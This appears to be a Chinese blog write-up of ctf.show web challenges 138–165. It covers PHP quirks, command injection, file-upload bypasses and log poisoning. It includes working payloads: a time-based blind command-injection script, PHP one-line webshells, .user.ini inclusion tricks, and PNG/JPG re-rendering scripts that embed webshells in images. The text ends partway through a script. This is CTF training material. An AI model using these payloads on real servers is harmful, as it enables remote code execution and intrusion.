<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">用于动态语境处理某个类的某个实例</span></span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure>

<p>也就是说::可以不用实例就能调用类的静态方法</p>
<h3 id="web-138"><a href="#web-138" class="headerlink" title="web 138"></a>web 138</h3><p>call_user_func可以传入数组</p>
<p>如果传入的数组是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">call_user_func(array($</span><span class="bash">classname,<span class="string">&#x27;function1&#x27;</span>))</span></span><br><span class="line">这个时候他就会直接调用classname类中的function1方法</span><br></pre></td></tr></table></figure>

<h3 id="web-139"><a href="#web-139" class="headerlink" title="web 139"></a>web 139</h3><p>跟136的代码一模一样，但是不能写文件，所以上面的方法不能用了，需要另外找一个方法：文件盲打</p>
<p>因为没有过滤sleep所以可以进行盲打</p>
<p>原理：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls / -1  #将根目录文件一行一个表示</span><br><span class="line">awk &#x27;NR==1&#x27; #截取第一行</span><br><span class="line">cut -c 1 #截取当前文件名的第一个字符</span><br></pre></td></tr></table></figure>

<p>将我们分割的文件对字母遍历，如果正确就设置一个sleep，如果正确执行则返回</p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web139_1.png" alt="1"></p>
<p>我们对这个进行一个判断：</p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web139_2.png" alt="1"></p>
<p>附上payload脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;+++++++++++&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://33f5eb0a-181b-4cbf-8014-74a54f04a425.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;ctfshowabdegijklmnpqrtuvxyz-&#123;&#125;0123456789&quot;</span></span><br><span class="line"><span class="comment">#for i in range(1,5):</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            <span class="comment">#payload = &#x27;if [ `ls / -1 | cut -c %d | awk &quot;NR==4&quot; ` == &quot;%s&quot; ];then sleep 4;fi&#x27; % (j,m)   #f149_15_h3r3</span></span><br><span class="line">            payload = <span class="string">&#x27;if [ `cat /f149_15_h3r3 |cut -c %d ` == &quot;%s&quot; ];then sleep 4;fi&#x27;</span> %(j,m)</span><br><span class="line">            target = url + payload</span><br><span class="line">            <span class="comment">#print(target)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io = requests.get(target,timeout=(<span class="number">3</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result += m</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result+=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="web-140"><a href="#web-140" class="headerlink" title="web 140"></a>web 140</h3><p>松散比较==:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0==&#x27;ctfshow&#x27;为真（8.0.0之后为假）</span><br><span class="line">所以我们需要$code为0</span><br><span class="line">也就是说我们只需要一个没有返回值的函数拼接就行了</span><br><span class="line">官方：usleep</span><br><span class="line">也可以使用两个system或者sleep什么的</span><br></pre></td></tr></table></figure>

<h3 id="web-141"><a href="#web-141" class="headerlink" title="web 141"></a>web 141</h3><p>url编码的构造形式：但字符串的ascii吗16进制前加%</p>
<p>用^构造出我们需要的字符，但是如何执行呢</p>
<p>构造异或之前写过，可以去翻翻</p>
<p><code>特性：运算符中间含有语句的时候可以一样执行</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">1+phpinfo()+1</span><br><span class="line">其中的phpinfo会一样执行</span><br></pre></td></tr></table></figure>

<h3 id="web-142"><a href="#web-142" class="headerlink" title="web 142"></a>web 142</h3><p>数字构造，直接构造0e在转换成int的时候会被判断为0，（—好像直接是0也可以—）</p>
<h3 id="web-143"><a href="#web-143" class="headerlink" title="web 143"></a>web 143</h3><p>无字符RCE：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">strr = &#x27;`!@#\^*=&quot;\&#x27;()[],/&lt;&gt;?:&#x27;</span><br><span class="line"></span><br><span class="line">for i in strr:</span><br><span class="line">    for j in strr:</span><br><span class="line">        for m in strr:</span><br><span class="line">            print(chr(ord(i)^ord(j)^ord(m)) +&#x27;=%&#x27;  + str(hex(ord(i)))[2:]  +&#x27;^%&#x27; +str(hex(ord(j)))[2:] + &#x27;^%&#x27; + str(hex(ord(m))))[2:]</span><br></pre></td></tr></table></figure>

<p>然后拼凑就好了</p>
<h3 id="web-144"><a href="#web-144" class="headerlink" title="web 144"></a>web 144</h3><p>过滤从V3变成了V2但是对V2的过滤消失了，所以我们可以把刚刚v3的payload放到v2，然后v3的长度要等于1直接构造<code>1-v2</code>就行了</p>
<h3 id="web-145"><a href="#web-145" class="headerlink" title="web 145"></a>web 145</h3><p>三目运算符的妙用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">return 1?phpinfo():1;</span><br><span class="line">执行phpinfo（）</span><br></pre></td></tr></table></figure>

<h3 id="web-146"><a href="#web-146" class="headerlink" title="web 146"></a>web 146</h3><p>增加了：过滤，可以用等号然后||绕过</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eval(&quot;return 1==phpinfo()||1&quot;);</span><br></pre></td></tr></table></figure>

<p>也会执行phpinfo</p>
<h3 id="web-147"><a href="#web-147" class="headerlink" title="web 147"></a>web 147</h3><p>使用创建函数<code>/create_function</code>前面添加/作用不仅是绕过，这是默认的命名空间，所有原生类以及函数都在这里，我们调用函数的时候其实是调用了一个相对路径的函数命，如果前面添加了一个/那么我们再调用函数的时候我们就必须加上/使用它的相对路径；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">create_function()用法</span><br><span class="line"><span class="meta">$</span><span class="bash">a = create_function(<span class="string">&#x27;$b&#x27;</span>,<span class="string">&#x27;return 1;&#x27;</span>)相当于</span></span><br><span class="line">function $a($b)&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们直接构造</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">post:ctf=create_function()</span><br><span class="line">get:show=;&#125;system(&#x27;tac f*&#x27;);##首先先闭合这个函数然后添加我们需要的代码,最后把后面的那个&#125;注释</span><br></pre></td></tr></table></figure>

<h3 id="web-148"><a href="#web-148" class="headerlink" title="web 148"></a>web 148</h3><p>可以直接使用上面的^拼凑，过滤换一下就行</p>
<p>wp是直接用上面的那些构造_GET然后用中文作为变量名，进行变量替换执行函数；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">哈=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;<span class="variable">$&#123;$哈&#125;</span>[嘿](<span class="variable">$&#123;$哈&#125;</span>[呜]);&amp;嘿=system&amp;呜=cat%20flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="web-149"><a href="#web-149" class="headerlink" title="web 149"></a>web 149</h3><p>题目会将除了index.php文件意外的所有文件都删除（当前目录下），但是它中间给我们留了一行文件写入，我们可以直接在index.php文件中写入一句话木马。</p>
<p>payload:<br><code>get:ctf=index.php post:show=&lt;?php eval($_POST[1]); ?&gt;</code></p>
<h3 id="web-150"><a href="#web-150" class="headerlink" title="web 150"></a>web 150</h3><p>这个题目里面对文件包含的这个ctf完全的没有做什么过滤只是<code>：</code>过滤不能使用任何协议。</p>
<p>所以我们可以直接写入日志文件，写入一个一句话木马，然后包含日志文件直接RCE，先得测试一下看看网站时什么服务器，在页面后面随便乱写一些页面，可以看到是nginx服务器，而他的一般日志文件在/var/log/nginx/access.log文件夹下，我们直接提前先写一个文件修改一个user-agent写一个一句话木马，然后包含日志文件最后RCE</p>
<h3 id="web-150-plus"><a href="#web-150-plus" class="headerlink" title="web 150_plus"></a>web 150_plus</h3><p>对上面的方法进行了过滤，ctf里面不能包含log得换一个办法，有一说一这个题目有一个缩进问题，导致容易看错，其实下面的function __autoload是独立出来不包含在类里面的，这种魔术方法 在试图使用当前脚本中尚未被定义的类时自动调用，可以看到下面没有回显所以<code>$__CTFSHOW__</code>这个变量是没有被创建的，但是上面的<code>extract($_GET);</code>可以进行变量覆盖必须得跟<code>$__CTFSHOW__</code>不同，所以得使用特性</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">空格   +    [    .   在变量中会被替换成下划线</span><br><span class="line">[之后的上述符号是不会被替换成下划线的</span><br><span class="line">所以我们构造变量覆盖可以构造..CTFSHOW..它就会被解析成__CTFSHOW__既不会进下面的if又可以进行覆盖进入上面的魔术方法，经过魔术方法返回之后可以将其变成函数，构造成</span><br><span class="line"><span class="meta">#</span><span class="bash">函数名（）;</span></span><br><span class="line">这种语句，直接输入phpinfo就可以执行phpinfo()</span><br><span class="line">flag包含在phpinfo里面</span><br></pre></td></tr></table></figure>

<h2 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web-151"><a href="#web-151" class="headerlink" title="web 151"></a>web 151</h3><p>过滤卸载了前端，直接修改前端代码，png改成php直接上传一句话木马</p>
<h3 id="web-152"><a href="#web-152" class="headerlink" title="web 152"></a>web 152</h3><p>除去前端的过滤后端也有过滤，但是只过滤了他的后缀格式，我们创建一句话将其改成png后缀发送过去之后抓包，抓到后修改格式就可以成功执行</p>
<h3 id="web-153"><a href="#web-153" class="headerlink" title="web 153"></a>web 153</h3><p>同样是抓包修改，但是出现一个问题，php修改后缀之后是无法直接用的，那么我们只能上传图片，然后在上传文件修改服务器的配置文件，让其中的文件改成php语言或者是包含这个文件让其执行。</p>
<p>对apache服务器来说是上传.htaccess文件构造上传，将我们上传的图片文件解析成php语言然后访问执行，如果是nginx服务器的话则是.user.ini配置文件，而且这个条件非常苛刻</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR和PHP_INI_USER模式的 INI 设置，而且只要是在使用CGI／FastCGI模式的服务器上都可以使用.user.ini</span><br></pre></td></tr></table></figure>

<p>题目里面开启了，所以可以用，有两个参数可以设置包含<code>auto_prepend_file</code>还有<code>auto_append_file</code>这只一个指定文件相当于使用了包含，文件将其内容包含在了php文件中,而这两个函数的区别则是一个是在文件之前插入一个实在文件之后插入，后者在插入的时候入宫文件结尾有exit（）则无法触发。</p>
<p>举个例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.user.ini</span><br><span class="line"></span><br><span class="line">GIF98a</span><br><span class="line">autp_prepend_file=1.jpg</span><br><span class="line"></span><br><span class="line">1.jpg</span><br><span class="line"></span><br><span class="line">GIF98a</span><br><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>GIF98a是一种图形交换格式（GIF）98a版（有时可以绕过检测）</p>
<p>这样他就会被包含在upload里面的index.php文件里面）</p>
<h3 id="web-154"><a href="#web-154" class="headerlink" title="web 154"></a>web 154</h3><p>对文件内容加了一层过滤，文件内容不能出现php用<code>&lt;?=</code>代替<code>&lt;?php</code>即可</p>
<h3 id="web-155"><a href="#web-155" class="headerlink" title="web 155"></a>web 155</h3><p>上面也可以</p>
<h3 id="web-156"><a href="#web-156" class="headerlink" title="web 156"></a>web 156</h3><p>过滤了<code>[]</code></p>
<p>可以直接在文件中调用system函数直接回显</p>
<h3 id="web-157"><a href="#web-157" class="headerlink" title="web 157"></a>web 157</h3><p>过滤了分号，因为在末尾直接删除即可</p>
<h3 id="web-158"><a href="#web-158" class="headerlink" title="web 158"></a>web 158</h3><p>不知道添加了啥，上一把的可以直接用</p>
<h3 id="web-159"><a href="#web-159" class="headerlink" title="web 159"></a>web 159</h3><p>system被ban了，用反引号闭合代替</p>
<h3 id="web-160"><a href="#web-160" class="headerlink" title="web 160"></a>web 160</h3><p>反引号被ban，可以使用包含日志文件，因为此服务器是nginx所以日志一般在/var/log/nginx/access.log</p>
<p>括号也被ban所以直接用双引号包裹就行，最后输入进去的时候发现还是不行，测试了一下因为log这边不能在一块，可以分割开来用<code>.</code></p>
<p>链接</p>
<h3 id="web-161"><a href="#web-161" class="headerlink" title="web 161"></a>web 161</h3><p>多了一层对图片识别的过滤，因为我们一直都有加GIF98a所以可以直接过</p>
<h3 id="web-162-163"><a href="#web-162-163" class="headerlink" title="web 162-163"></a>web 162-163</h3><p>条件竞争，环境做不了</p>
<h3 id="web-164"><a href="#web-164" class="headerlink" title="web 164"></a>web 164</h3><p>图片的二次渲染绕过：摘录一下wu名大佬的脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>zui后生成的脚本就是<code>&lt;?$_GET[0]($_POST[1]);?&gt;</code></p>
<p>将这个文件上传上去就可以进行rce了</p>
<h3 id="web-165"><a href="#web-165" class="headerlink" title="web 165"></a>web 165</h3><p>上一题是png二次渲染，这一条是jpg二次渲染，类型差不多，只不过jpg渲染比较繁琐，脚本也比较长，附上脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span 